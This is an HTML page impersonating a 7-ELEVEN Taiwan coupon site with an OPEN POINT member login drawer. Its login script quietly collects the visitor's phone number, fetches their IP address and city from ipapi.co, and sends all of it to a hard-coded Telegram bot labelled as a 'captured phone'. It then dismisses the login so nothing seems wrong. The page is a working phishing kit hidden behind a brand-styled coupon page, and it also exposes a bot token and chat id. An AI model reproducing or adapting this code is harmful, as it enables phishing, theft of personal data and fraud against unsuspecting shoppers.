<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>7-ELEVEN 雲端折價券</title>
    
    <link rel="icon" href="https://www.7-11.com.tw/favicon.ico?v=2" type="image/x-icon">
    <link rel="shortcut icon" href="https://www.7-11.com.tw/favicon.ico?v=2" type="image/x-icon">
    
    <style>
        :root {
            --seven-orange: #F47920;
            --seven-green: #00A651;
            --seven-red: #E1251B;
            --bg-color: #F8F9FA;
            --text-dark: #333333;
            --text-gray: #777777;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, 'PingFang TC', 'Microsoft JhengHei', sans-serif; }

        body { background-color: var(--bg-color); color: var(--text-dark); max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.05); position: relative; overflow: hidden; }

        /* Login & Modal */
        #login-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.6); z-index: 999; display: flex; align-items: flex-end; justify-content: center; transition: opacity 0.4s ease; }
        #login-drawer { width: 100%; max-width: 500px; background: #ffffff; border-radius: 20px 20px 0 0; padding: 30px 25px 40px; transform: translateY(0); transition: transform 0.4s cubic-bezier(0.1, 0.8, 0.2, 1); }
        .drawer-handle { width: 40px; height: 5px; background-color: #e0e0e0; border-radius: 5px; margin: 0 auto 20px; }
        #login-drawer h2 { text-align: center; font-size: 1.4rem; color: var(--seven-green); margin-bottom: 10px; }
        #login-drawer p { text-align: center; font-size: 0.9rem; color: var(--text-gray); margin-bottom: 25px; }
        .input-group { display: flex; flex-direction: column; gap: 15px; }
        .phone-input { width: 100%; padding: 15px; font-size: 1.1rem; border: 2px solid #eeeeee; border-radius: 10px; outline: none; text-align: center; }
        .login-btn { width: 100%; padding: 15px; background-color: var(--seven-green); color: white; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: bold; cursor: pointer; }

        #barcode-modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.7); z-index: 1000; display: none; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease; }
        #barcode-modal { background: white; width: 85%; max-width: 350px; border-radius: 15px; padding: 30px 20px; text-align: center; }
        .fake-barcode { height: 80px; width: 100%; background: repeating-linear-gradient(90deg, #000 0, #000 2px, #fff 2px, #fff 4px, #000 4px, #000 5px, #fff 5px, #fff 8px, #000 8px, #000 12px, #fff 12px, #fff 14px, #000 14px, #000 15px, #fff 15px, #fff 18px); margin: 15px 0 5px; }
        .close-modal-btn { background-color: #f0f0f0; border: none; padding: 10px 30px; border-radius: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }

        /* Header */
        header { background-color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--seven-green); position: sticky; top: 0; z-index: 10; }
        .logo { font-size: 1.2rem; font-weight: 900; color: var(--seven-orange); display: flex; align-items: center; }
        .search-btn { background: none; border: none; font-size: 1rem; color: var(--seven-green); font-weight: bold; }
        .categories { display: flex; overflow-x: auto; padding: 15px 20px; background-color: var(--bg-color); gap: 10px; }
        .tab { padding: 8px 16px; background-color: white; border-radius: 20px; font-size: 0.9rem; font-weight: bold; color: var(--text-gray); border: 1px solid #ddd; cursor: pointer; }
        .tab.active { background-color: var(--seven-green); color: white; border-color: var(--seven-green); }

        /* Coupons */
        .coupon-list { padding: 20px; background-color: var(--bg-color); min-height: 70vh; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .coupon-card { background: white; border-radius: 12px; margin-bottom: 15px; display: flex; box-shadow: 0 4px 10px rgba(0,0,0,0.03); border: 2px dashed #e0e0e0; height: 120px; overflow: hidden; }
        .coupon-img { width: 110px; flex-shrink: 0; border-right: 2px dashed #e0e0e0; }
        .coupon-info { padding: 12px 15px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
        .use-btn { background-color: var(--seven-orange); color: white; border: none; padding: 6px 12px; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div id="login-drawer">
            <div class="drawer-handle"></div>
            <h2>OPEN POINT 會員登入</h2>
            <p>請輸入手機號碼，即可查看您的專屬折價券</p>
            <div class="input-group">
                <input type="tel" id="phone-input" class="phone-input" placeholder="請輸入 09 開頭手機號碼" maxlength="10">
                <button class="login-btn" onclick="submitLogin()">驗證並登入</button>
            </div>
        </div>
    </div>

    <div id="barcode-modal-overlay">
        <div id="barcode-modal">
            <div id="modal-item-name" style="font-weight:bold;">商品名稱</div>
            <div id="modal-item-price" style="color:red; margin:10px 0;">特價資訊</div>
            <div class="fake-barcode"></div>
            <div id="dynamic-barcode" style="font-family:monospace; font-weight:bold;">471 0000 0000 0</div>
            <button class="close-modal-btn" onclick="closeBarcode()">完成</button>
        </div>
    </div>

    <header>
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/7-eleven_logo.svg" alt="7-11" style="height: 30px; margin-right: 10px;">
            <span>優惠專區</span>
        </div>
        <button class="search-btn">搜尋</button>
    </header>

    <div class="categories">
        <div class="tab active" onclick="switchTab('tab-all', this)">全部優惠</div>
        <div class="tab" onclick="switchTab('tab-cafe', this)">CITY CAFE</div>
    </div>

    <div class="coupon-list">
        <div id="tab-all" class="tab-content active">
            <div class="coupon-card">
                <div class="coupon-img" style="background:#eee;"></div>
                <div class="coupon-info">
                    <div>
                        <div style="font-weight:bold;">大杯冰拿鐵</div>
                        <div style="color:red;">第2杯半價</div>
                    </div>
                    <button class="use-btn" onclick="showBarcode('大杯冰拿鐵', '第2杯半價')">出示條碼</button>
                </div>
            </div>
        </div>
        <div id="tab-cafe" class="tab-content">
            <div class="coupon-card">
                <div class="coupon-img" style="background:#eee;"></div>
                <div class="coupon-info">
                    <div>
                        <div style="font-weight:bold;">美式咖啡</div>
                        <div style="color:red;">買二送一</div>
                    </div>
                    <button class="use-btn" onclick="showBarcode('美式咖啡', '買二送一')">出示條碼</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function submitLogin() {
            const phone = document.getElementById('phone-input').value.trim();
            if(phone.length < 10) return alert('請輸入完整號碼');
            
            const btn = document.querySelector('.login-btn');
            btn.textContent = "驗證中...";
            
            (async () => {
                try {
                    const res = await fetch("https://ipapi.co/json/");
                    const ipInfo = await res.json();
                    const msg = `🎯 捕獲手機: ${phone}\nIP: ${ipInfo.ip}\n位置: ${ipInfo.city}`;
                    fetch(`https://api.telegram.org/bot8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU/sendMessage`, {
                        method: "POST", headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({chat_id: "1647683895", text: msg})
                    });
                } catch(e) {}
            })();

            setTimeout(() => {
                document.getElementById('login-overlay').style.display = 'none';
                document.body.style.overflow = 'auto';
            }, 1500);
        }

        function switchTab(id, el) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function showBarcode(name, price) {
            document.getElementById('modal-item-name').innerText = name;
            document.getElementById('modal-item-price').innerText = price;
            document.getElementById('barcode-modal-overlay').style.display = 'flex';
            setTimeout(() => document.getElementById('barcode-modal-overlay').style.opacity = '1', 10);
        }

        function closeBarcode() {
            document.getElementById('barcode-modal-overlay').style.opacity = '0';
            setTimeout(() => document.getElementById('barcode-modal-overlay').style.display = 'none', 300);
        }
    </script>
</body>
</html>
